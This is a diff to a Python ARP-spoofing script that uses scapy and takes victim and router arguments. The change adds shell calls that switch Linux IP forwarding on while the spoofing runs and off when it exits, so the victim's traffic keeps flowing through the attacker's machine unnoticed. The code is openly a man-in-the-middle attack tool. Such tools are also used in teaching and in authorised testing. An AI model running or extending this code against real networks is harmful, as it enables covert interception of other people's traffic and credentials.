@@ -3,7 +3,7 @@
 
 from scapy.all import Ether, ARP, send, srp, get_if_addr
 from argparse import ArgumentParser
-from os import getuid
+from os import getuid, system 
 from time import sleep
 
 
@@ -91,6 +91,9 @@ def main(args):
     if(getuid() != 0):
         exit("[!] Run this script as a root!!!\n[!] Exiting...")
 
+    # Unable port forwarding
+    system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
     sentPackets = 0
     myip = get_if_addr(args.interface)
 
@@ -109,6 +112,8 @@ def main(args):
         sleep(1)
         restore(args.victim, args.router, args.interface)
         restore(args.router, args.victim, args.interface)
+        # Disable port forwarding       
+        system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         exit("[-] Exiting...")
 
     except IndexError:
